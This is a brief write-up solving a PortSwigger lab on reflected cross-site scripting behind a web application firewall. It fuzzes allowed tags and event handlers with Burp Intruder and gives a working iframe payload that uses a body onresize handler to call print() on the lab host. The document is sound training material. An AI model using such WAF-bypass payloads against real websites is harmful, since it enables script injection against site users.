# Reflected XSS into HTML context with most tags and attributes blocked

## This lab contains a [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.

## To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that bypasses the WAF and calls the `print()` function.

### HINT:

```javascript
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

---

### step 1

search any tag<> like `<script>` you will notice it is blocked not allowed
intercept this request and send to intruder
add <§§> into search into intruder then add payload from xss cheat seat copy `copy tag to clipboard`
you will get 200 response
`<body>` tag is allowed

### step2

add <body%20§§=1> into search into intruder
add payload from xss cheat seat copy `copy event to clipboard`
<<body%20onbeforeinput=1>
<<body%20onresize=1>
<<body%20onscrollend=1>
these give 200 response

### step3

```javascript
<iframe src="https://0a9600c2042f98f480dae9cb00ec001d.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

add into expolit page and deliver expolit to victim
